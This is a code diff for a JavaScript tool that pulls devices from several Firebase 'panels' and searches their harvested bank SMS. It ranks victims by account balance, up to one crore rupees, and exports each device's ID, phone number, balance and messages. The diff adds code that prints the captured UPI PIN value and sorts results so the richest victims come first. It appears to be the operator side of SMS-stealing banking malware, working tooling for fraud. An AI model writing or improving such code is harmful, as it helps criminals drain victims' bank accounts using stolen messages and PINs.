@@ -1,9 +1,9 @@
 import { fetchAllPanels, normalizeFirebaseUrl } from './panelCore.mjs';
-import { processBankMessages } from './bankSms.mjs';
+import { processBankMessages, formatSmsWhen } from './bankSms.mjs';
 
 const TIERS = {
-  low_high: { min: 2_000, max: 50_000, label: 'BAL LOW→HIGH (2K–50K)', sort: 'asc' },
-  high_low: { min: 30_000, max: 9_000_000, label: 'BAL HIGH→LOW (30K–90L)', sort: 'desc' },
+  low_high: { min: 2_000, max: 50_000, label: 'BAL 2K–50K (bada→chota)', sort: 'desc' },
+  high_low: { min: 30_000, max: 9_000_000, label: 'BAL 30K–90L (bada→chota)', sort: 'desc' },
   bank70k: { min: 70_000, max: 10_000_000, label: 'Bank 70K–1Cr', sort: 'desc' },
   user30_90L: { min: 30_000, max: 9_000_000, label: 'BAL 30K–90L', sort: 'desc' },
 };
@@ -110,7 +110,8 @@ export function buildSearchHeader(opts, tier) {
     : opts.online
       ? 'ONLINE DEVICES ONLY'
       : 'OFFLINE DEVICES ONLY';
-  return `SMS SEARCH RESULTS- AVL/BAL & BANK- ${statPart}- ${pinPart}- ${tier.label}- LAST ${opts.days} DAY(S)`;
+  const dayPart = opts.days === 0 ? 'ALL TIME' : `LAST ${opts.days} DAY(S)`;
+  return `SMS SEARCH RESULTS- AVL/BAL & BANK- ${statPart}- ${pinPart}- ${tier.label}- ${dayPart}`;
 }
 
 export function buildExportText(results, opts, tier, panelsTotal, dbPanelsHit, elapsedMs) {
@@ -130,14 +131,21 @@ export function buildExportText(results, opts, tier, panelsTotal, dbPanelsHit, e
     lines.push(`Firebase: ${normalizeFirebaseUrl(d.panelUrl)}`);
     lines.push(`Device ID: ${d.id}`);
     lines.push(`Phone: ${d.phone || '—'}`);
-    lines.push(`UPI PIN: ${d.hasPin ? 'YES' : 'NO'}`);
+    if (d.hasPin && d.pinValue) {
+      lines.push(`UPI PIN: YES | PIN: ${d.pinValue}`);
+    } else if (d.hasPin) {
+      lines.push('UPI PIN: YES');
+    } else {
+      lines.push('UPI PIN: NO');
+    }
     if (d.maxBalance) lines.push(`Peak Avl Bal: Rs.${d.maxBalance.toLocaleString('en-IN')}`);
     lines.push(`Status: ${d.status ? 'Online' : 'Offline'} | SMS Count: ${smsList.length}`);
     lines.push(`Panel: ${d.panelName || '—'}`);
   lines.push('');
     smsList.forEach(m => {
+      const when = formatSmsWhen(m.ts, m.time);
       lines.push('---------------------------------------------------');
-      lines.push(`[${m.sender}]`);
+      lines.push(`[${m.sender}] | ${when}`);
       lines.push(m.text);
     });
     lines.push('');
@@ -192,7 +200,7 @@ export async function runSearch(panels, opts, onProgress) {
   filtered.sort((a, b) => {
     const aa = a.maxBalance || a.maxTxn || 0;
     const ab = b.maxBalance || b.maxTxn || 0;
-    return tier.sort === 'asc' ? aa - ab : ab - aa;
+    return ab - aa;
   });
 
   const elapsed = Date.now() - t0;
